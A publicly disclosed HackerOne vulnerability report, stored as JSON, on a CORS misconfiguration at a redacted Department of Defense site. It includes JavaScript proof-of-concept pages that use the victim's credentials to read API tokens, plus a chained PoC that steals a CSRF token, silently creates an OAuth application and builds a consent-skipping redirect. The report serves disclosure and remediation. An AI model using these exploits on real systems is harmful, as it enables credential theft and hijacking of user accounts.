{"id":733017,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzMwMTc=","url":"https://hackerone.com/reports/733017","title":"CORS Misconfiguration Leads to Exposing User Data","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-11-09T08:40:47.807Z","submitted_at":"2019-11-09T08:40:47.807Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"waymobetta","url":"/waymobetta","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fu9uQtHGzgVR2rNu2Mcetg2o/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://www.dc3.mil/vulnerability-disclosure","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-05-14T17:15:14.213Z","bug_reporter_agreed_on_going_public_at":"2020-02-03T17:36:46.634Z","team_member_agreed_on_going_public_at":"2020-05-14T17:15:14.091Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Vulnerable Asset:** https://██████/█████████/\n\n**Discovery:**\n- Upon accessing the site we discover two specific response headers which indicates that a cross-domain request for sensitive information might be possible\n 1. Access-Control-Allow-Origin: *injectable*\n 2. Access-Control-Allow-Credentials: true\n- We craft a POC below and exploit the misconfigurations present by exposing the users API key, email, first name, last name, etc.\n\n███\n\n**POC:**\n* This is hosted on http://█████████\n\n```html\n\u003chtml\u003e\n\u003cscript\u003e\n  var xhttp = new XMLHttpRequest();\n  \u003c!-- the below endpoint lists API tokens previously generated by the user --\u003e\n  xhttp.open(\"GET\", \"https://█████/████/api/token/list\", true);\n  xhttp.withCredentials = true;\n  xhttp.send(null);\n\u003c/script\u003e\n\u003c/html\u003e\n```\n\n**Demo:**\n\n███████\n\n**Remediations:**\n- Do not allow the Access-Control-Allow-Origin to be arbitrarily set by the user; the domain should be whitelisted that is allowed access to CORS, or the wildcard operator `*` should be used instead, which will disallow the Allow-Credentials header\n\n## Impact\n\nThis attack works similarly to a CSRF attack in that an attacker would need to have a victim visit the attacker's website in order to trigger the exploit. If the victim is logged in, then the result is full access to API keys which serve in lieu of username/password as shown in the demo. The attacker then can perform any action within the user's account that the API allows.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eVulnerable Asset:\u003c/strong\u003e https://██████/█████████/\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDiscovery:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eUpon accessing the site we discover two specific response headers which indicates that a cross-domain request for sensitive information might be possible\n\n\u003col\u003e\n\u003cli\u003eAccess-Control-Allow-Origin: \u003cem\u003einjectable\u003c/em\u003e\n\u003c/li\u003e\n\u003cli\u003eAccess-Control-Allow-Credentials: true\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eWe craft a POC below and exploit the misconfigurations present by exposing the users API key, email, first name, last name, etc.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e███\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePOC:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eThis is hosted on http://█████████\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003exhttp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e\u0026lt;!--\u003c/span\u003e \u003cspan class=\"nx\"\u003ethe\u003c/span\u003e \u003cspan class=\"nx\"\u003ebelow\u003c/span\u003e \u003cspan class=\"nx\"\u003eendpoint\u003c/span\u003e \u003cspan class=\"nx\"\u003elists\u003c/span\u003e \u003cspan class=\"nx\"\u003eAPI\u003c/span\u003e \u003cspan class=\"nx\"\u003etokens\u003c/span\u003e \u003cspan class=\"nx\"\u003epreviously\u003c/span\u003e \u003cspan class=\"nx\"\u003egenerated\u003c/span\u003e \u003cspan class=\"nx\"\u003eby\u003c/span\u003e \u003cspan class=\"nx\"\u003ethe\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e--\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhttp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eGET\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://█████/████/api/token/list\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhttp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewithCredentials\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhttp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eDemo:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e███████\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eRemediations:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eDo not allow the Access-Control-Allow-Origin to be arbitrarily set by the user; the domain should be whitelisted that is allowed access to CORS, or the wildcard operator \u003ccode\u003e*\u003c/code\u003e should be used instead, which will disallow the Allow-Credentials header\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis attack works similarly to a CSRF attack in that an attacker would need to have a victim visit the attacker\u0026#39;s website in order to trigger the exploit. If the victim is logged in, then the result is full access to API keys which serve in lieu of username/password as shown in the demo. The attacker then can perform any action within the user\u0026#39;s account that the API allows.\u003c/p\u003e\n","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":2,"voters":["styrene","sl33pyp0t4t0"],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6262935,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","markdown_message":"\u003cp\u003eGreetings from the Department of Defense (DoD),\u003c/p\u003e\n\n\u003cp\u003eThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\u003c/p\u003e\n\n\u003cp\u003eBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at \u003ca href=\"/deptofdefense\"\u003e@DeptofDefense\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\u003c/p\u003e\n\n\u003cp\u003eWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\u003c/p\u003e\n\n\u003cp\u003eOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003eThe VDP Team\u003c/p\u003e\n","automated_response":true,"created_at":"2019-11-09T08:40:48.129Z","updated_at":"2019-11-09T08:40:48.129Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6267894,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"*NOTE: The above vulnerability was also found present on the immediate parent subdomain. It was originally thought that the IP of this subdomain would be shared with its parent, https://████/██████████, however that was discovered to be incorrect; therefore, a separate report can be created since the DNS is configured in such a way to give this subdomain a unique IP.*\n\nAs a result, it is unclear whether a code fix for this report would also fix the parent subdomain. Please let me know if you'd like for me to create a separate report.\n\n**Unique IPs:**\n*https://██████████/████████:*\n███████\n\n*https://███████/█████████:*\n███████","markdown_message":"\u003cp\u003e\u003cem\u003eNOTE: The above vulnerability was also found present on the immediate parent subdomain. It was originally thought that the IP of this subdomain would be shared with its parent, https://████/██████████, however that was discovered to be incorrect; therefore, a separate report can be created since the DNS is configured in such a way to give this subdomain a unique IP.\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003eAs a result, it is unclear whether a code fix for this report would also fix the parent subdomain. Please let me know if you\u0026#39;d like for me to create a separate report.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eUnique IPs:\u003c/strong\u003e\u003cbr\u003e\n\u003cem\u003ehttps://██████████/████████:\u003c/em\u003e\u003cbr\u003e\n███████\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003ehttps://███████/█████████:\u003c/em\u003e\u003cbr\u003e\n███████\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-10T00:26:55.405Z","updated_at":"2020-05-14T17:13:59.109Z","actor":{"username":"waymobetta","cleared":false,"url":"/waymobetta","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fu9uQtHGzgVR2rNu2Mcetg2o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6268121,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Continuing to leverage this vulnerability (demonstrated on https://███████/███), we are able to:\n 1. create an API application\n 2. the resulting creation of an API application will allow us to craft a malicious link that we can send to our victim in order to perform an open redirect to a domain of our choosing\n\n*Upon reviewal of the API documentation, we find the ability to redirect a logged-in user to _any_ domain following the below URL format*\n\n██████████\n\n**Crafting the Malicious URL:**\n- Leveraging the poor access control above we are able to visit https://████/████████/api/application/list\n- If the user already has an application they've created we can skip the application creation portion of this report (which is the majority) and jump right to performing the redirect\n- If they have not already created an application, we can create one for them by leveraging the `/████/api/application/add` endpoint\n- We obtain the CSRF token present in the source code of this endpoint and send it along with the payload to create an API application\n████\n- After successful creation of the API application, we obtain the Client ID (required for the redirect)\n- We then modify the `response_type` query parameter value shown in the original redirect documentation so that we are able to bypass a page prompting the user to authorize the API, ensuring fluid redirect execution and avoiding tipping off the user to the impending detour\n\n████\n^ We would like to *silently* authorize waymobetta\n\n**PoCs:**\n\n*API_Creation_POC.html*\n```html\n\u003chtml\u003e\n\t\u003cscript\u003e\n\t\tvar xhr = new XMLHttpRequest();\n\t\txhr.onload = handleResponse;\n\t\txhr.open('get', 'https://██████████/███████/api/application/add', true);\n\t\txhr.withCredentials = true;\n\t\txhr.send();\n\t\tfunction handleResponse() {\n\t\t\tvar token = this.responseText.match(\"name='csrfmiddlewaretoken' value=(.*)? /\u003e\")[1].trim()\n\t\t\tvar token_stripped = token.substring(0,token.length -1).substring(1)\n\t\t\tvar createApp = new XMLHttpRequest();\n\t\t\tcreateApp.open('post', 'https://██████/█████/api/application/add', true);\n\t\t\tcreateApp.withCredentials = true;\n\t\t\tcreateApp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\")\n            var payload = 'csrfmiddlewaretoken='+token_stripped+'\u0026authorization_grant_type=authorization-code\u0026name=waymobetta\u0026client_type=confidential\u0026redirect_uris=https%3A%2F%2F████'\n            createApp.send(payload);\n\t\t};\n\t\u003c/script\u003e\n\u003c/html\u003e\n```\n\n*List_API_Applications_POC.html:*\n```html\n\u003chtml\u003e\n\u003cscript\u003e\nfunction cors() {\n  var xhr = new XMLHttpRequest();\n  xhr.open(\"GET\", \"https://████████/█████████/api/application/list\", true);\n  xhr.withCredentials = true;\n  xhr.send(null);\n}\n\u003c/script\u003e\n\u003c/html\u003e\n```\n\nWe can then pull the *Client ID* from the above POC response and use it to craft our malicious redirect URL.\n\nWhen visited, this link will automatically redirect our logged-in victim to any domain. In this case, https://█████████\n```\nhttps://████████/████/api/authorize?response_type=\u0026client_id=███\u0026redirect_uri=https://████████\n```\n\n**Demos:**\n*API Application Creation:*\n███\n\n*List API Applications:*\n████████\n\n*Redirect:*\n████████\n\n---\n\nOverall quite a lot of work to craft a simple URL that will redirect a *logged-in* victim to any webpage.. but the point here is that by continuing to leverage the original CORS misconfiguration we can rain down further annoyance- and potentially exploitation too- on our victim user.","markdown_message":"\u003cp\u003eContinuing to leverage this vulnerability (demonstrated on https://███████/███), we are able to:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003ecreate an API application\u003c/li\u003e\n\u003cli\u003ethe resulting creation of an API application will allow us to craft a malicious link that we can send to our victim in order to perform an open redirect to a domain of our choosing\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cem\u003eUpon reviewal of the API documentation, we find the ability to redirect a logged-in user to \u003cu\u003eany\u003c/u\u003e domain following the below URL format\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003e██████████\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eCrafting the Malicious URL:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eLeveraging the poor access control above we are able to visit https://████/████████/api/application/list\u003c/li\u003e\n\u003cli\u003eIf the user already has an application they\u0026#39;ve created we can skip the application creation portion of this report (which is the majority) and jump right to performing the redirect\u003c/li\u003e\n\u003cli\u003eIf they have not already created an application, we can create one for them by leveraging the \u003ccode\u003e/████/api/application/add\u003c/code\u003e endpoint\u003c/li\u003e\n\u003cli\u003eWe obtain the CSRF token present in the source code of this endpoint and send it along with the payload to create an API application\n████\u003c/li\u003e\n\u003cli\u003eAfter successful creation of the API application, we obtain the Client ID (required for the redirect)\u003c/li\u003e\n\u003cli\u003eWe then modify the \u003ccode\u003eresponse_type\u003c/code\u003e query parameter value shown in the original redirect documentation so that we are able to bypass a page prompting the user to authorize the API, ensuring fluid redirect execution and avoiding tipping off the user to the impending detour\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e████\u003cbr\u003e\n^ We would like to \u003cem\u003esilently\u003c/em\u003e authorize waymobetta\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePoCs:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eAPI_Creation_POC.html\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ehandleResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eget\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttps://██████████/███████/api/application/add\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewithCredentials\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ehandleResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003etoken\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponseText\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ematch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ename=\u0026#39;csrfmiddlewaretoken\u0026#39; value=(.*)? /\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003etrim\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003etoken_stripped\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003etoken\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esubstring\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nx\"\u003etoken\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003esubstring\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ecreateApp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003ecreateApp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003epost\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttps://██████/█████/api/application/add\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003ecreateApp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewithCredentials\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003ecreateApp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetRequestHeader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eContent-type\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ecsrfmiddlewaretoken=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003etoken_stripped\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026amp;authorization_grant_type=authorization-code\u0026amp;name=waymobetta\u0026amp;client_type=confidential\u0026amp;redirect_uris=https%3A%2F%2F████\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003ecreateApp\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cem\u003eList_API_Applications_POC.html:\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ecors\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eGET\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://████████/█████████/api/application/list\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewithCredentials\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe can then pull the \u003cem\u003eClient ID\u003c/em\u003e from the above POC response and use it to craft our malicious redirect 